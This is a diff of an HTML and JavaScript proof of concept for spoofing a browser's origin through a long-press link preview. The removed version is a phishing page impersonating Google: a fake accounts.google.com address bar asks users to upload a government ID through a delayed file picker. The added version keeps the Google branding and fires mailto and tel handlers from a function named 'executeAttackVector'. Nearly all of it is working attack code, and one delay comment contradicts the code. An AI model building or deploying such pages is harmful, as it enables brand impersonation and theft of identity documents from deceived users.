@@ -3,141 +3,67 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Security Portal - Verification</title>
+    <title>File Picker Origin Spoof PoC</title>
     <style>
-        :root {
-            --primary-color: #1a73e8;
-            --bg-color: #f8f9fa;
-            --text-main: #202124;
-            --text-secondary: #5f6368;
-            --border-color: #dadce0;
-        }
-
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            background-color: var(--bg-color);
-            color: var(--text-main);
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: flex-start;
-            min-height: 100vh;
-            margin: 0;
-            padding: 0;
-        }
-
-        /* Fake Browser Top Bar untuk memperkuat ilusi origin */
-        .fake-browser-bar {
-            width: 100%;
-            background: #ffffff;
-            border-bottom: 1px solid var(--border-color);
-            padding: 10px 16px;
-            display: flex;
-            align-items: center;
-            box-sizing: border-box;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
-        }
-
-        .fake-address-box {
-            flex-grow: 1;
-            background: #f1f3f4;
-            border-radius: 20px;
-            padding: 6px 16px;
-            font-size: 13px;
-            color: var(--text-secondary);
-            display: flex;
-            align-items: center;
-            max-width: 500px;
-            margin: 0 auto;
-            border: 1px solid transparent;
-        }
-
-        .fake-address-box span {
-            color: #137333; /* Warna indikator HTTPS aman */
-            font-weight: 500;
-            margin-right: 6px;
-        }
-
-        .content-wrapper {
+            background-color: #f8f9fa;
+            color: #202124;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            flex-grow: 1;
+            min-height: 100vh;
+            margin: 0;
             padding: 20px;
             text-align: center;
-            max-width: 400px;
         }
-
-        .shield-icon {
-            width: 48px;
-            height: 48px;
-            margin-bottom: 16px;
-            fill: var(--primary-color);
-        }
-
         .banner {
-            font-size: 12px;
-            color: var(--text-secondary);
-            margin-bottom: 4px;
+            font-size: 13px;
+            color: #5f6368;
+            margin-bottom: 6px;
             text-transform: uppercase;
-            letter-spacing: 1px;
-            font-weight: 600;
+            letter-spacing: 0.8px;
         }
-
         h1 {
-            font-size: 22px;
-            color: var(--text-main);
-            margin-bottom: 8px;
-        }
-
-        p.description {
-            font-size: 14px;
-            color: var(--text-secondary);
+            font-size: 20px;
+            color: #1a73e8;
             margin-bottom: 24px;
-            line-height: 1.5;
         }
-
         a.spoof-link {
             display: inline-block;
-            background-color: var(--primary-color);
+            background-color: #1a73e8;
             color: white;
             padding: 14px 28px;
             text-decoration: none;
-            font-weight: 500;
+            font-weight: 600;
             font-size: 15px;
-            border-radius: 4px;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.2);
-            transition: background-color 0.2s, box-shadow 0.2s;
-            cursor: pointer;
-            width: 100%;
-            box-sizing: border-box;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(26, 115, 232, 0.25);
+            transition: background-color 0.2s;
         }
-
         a.spoof-link:active {
             background-color: #1557b0;
         }
-
         .preview-container {
-            margin-top: 20px;
-            width: 100%;
+            margin-top: 25px;
+            max-width: 280px;
             display: none;
-            text-align: left;
-            background: #ffffff;
-            padding: 12px;
-            border-radius: 8px;
-            border: 1px solid var(--border-color);
         }
-
+        .preview-container img {
+            width: 100%;
+            border-radius: 8px;
+            border: 1px solid #dadce0;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.08);
+        }
         .file-info {
+            margin-top: 10px;
             font-size: 13px;
-            color: var(--text-main);
-            font-weight: 500;
+            color: #5f6368;
             word-break: break-all;
         }
-
         .footer-note {
-            margin-top: 40px;
+            margin-top: 30px;
             font-size: 11px;
             color: #9aa0a6;
         }
@@ -145,33 +71,19 @@
 </head>
 <body>
 
-    <!-- Simulasi Fake Browser Address Bar -->
-    <div class="fake-browser-bar">
-        <div class="fake-address-box">
-            <span>🔒</span> https://accounts.google.com/v3/signin/identifier
-        </div>
+    <div class="banner">Google Security Portal</div>
+    <h1>Secure Document Verification</h1>
+
+    <!-- Target Link to trigger Preview Page -->
+    <a href="https://google.com" class="spoof-link" id="targetLink">Open New Window & Contact Support</a>
+
+    <!-- Uploaded Image Preview Box -->
+    <div class="preview-container" id="previewBox">
+        <img id="imagePreview" src="" alt="File Preview">
+        <div class="file-info" id="fileInfo"></div>
     </div>
 
-    <div class="content-wrapper">
-        <!-- Google Shield Mock Icon -->
-        <svg class="shield-icon" viewBox="0 0 24 24">
-            <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/>
-        </svg>
-
-        <div class="banner">Google Account Security</div>
-        <h1>Identity Verification</h1>
-        <p class="description">To secure your account, please upload a valid government-issued ID or verification document.</p>
-
-        <!-- Target Link -->
-        <a href="https://google.com" class="spoof-link" id="targetLink">Select Document & Proceed</a>
-
-        <!-- File Info Box -->
-        <div class="preview-container" id="previewBox">
-            <div class="file-info" id="fileInfo"></div>
-        </div>
-
-        <div class="footer-note">Protected by Google Advanced Protection.</div>
-    </div>
+    <div class="footer-note">Cloud-secured verification system.</div>
 
     <script>
         let triggered = false;
@@ -180,38 +92,36 @@
             if (triggered) return;
             triggered = true;
 
-            // Penundaan sinkronisasi dengan animasi pembukaan jendela baru
+            // Timer optimized to match the preview page opening animation
             setTimeout(async () => {
                 try {
-                    const [fileHandle] = await window.showOpenFilePicker({
-                        multiple: false,
-                        types: [{
-                            description: 'Secure Documents',
-                            accept: { 
-                                'image/*': ['.png', '.jpg', '.jpeg'],
-                                'application/pdf': ['.pdf']
-                            }
-                        }]
-                    });
-
-                    const file = await fileHandle.getFile();
+                    // Mengganti file picker dengan skema mailto dan tel
+                    const actionType = Math.random() < 0.5 ? 'mailto' : 'tel';
                     
-                    // Tampilkan status berkas terpilih
-                    document.getElementById("fileInfo").innerText = `✓ Terunggah: ${file.name}`;
-                    document.getElementById("previewBox").style.display = "block";
+                    if (actionType === 'mailto') {
+                        window.location.href = "mailto:support@google.com?subject=Verification%20Support&body=Please%20verify%20my%20account.";
+                        document.getElementById("fileInfo").innerText = "Triggered mailto protocol handler.";
+                    } else {
+                        window.location.href = "tel:+18005550199";
+                        document.getElementById("fileInfo").innerText = "Triggered tel protocol handler.";
+                    }
+
+                    const previewBox = document.getElementById("previewBox");
+                    imagePreview.src = "";
+                    previewBox.style.display = "block";
 
                 } catch (err) {
-                    console.debug("Picker dibatalkan:", err.message);
+                    console.debug("Handler cancelled or blocked:", err.message);
                 } finally {
-                    setTimeout(() => { triggered = false; }, 1000);
+                    setTimeout(() => { triggered = false; }, 900);
                 }
-            }, 1200); 
+            }, 1300); // 1.7 seconds delay for ephemeral tab
         };
 
+        // Event listener for context menu (Long Press)
         const targetElement = document.getElementById("targetLink");
 
-        // Pemicu berbasis interaksi sentuh/long-press
-        targetElement.addEventListener("contextmenu", (e) => {
+        targetElement.addEventListener("contextmenu", () => {
             executeAttackVector();
         });
 
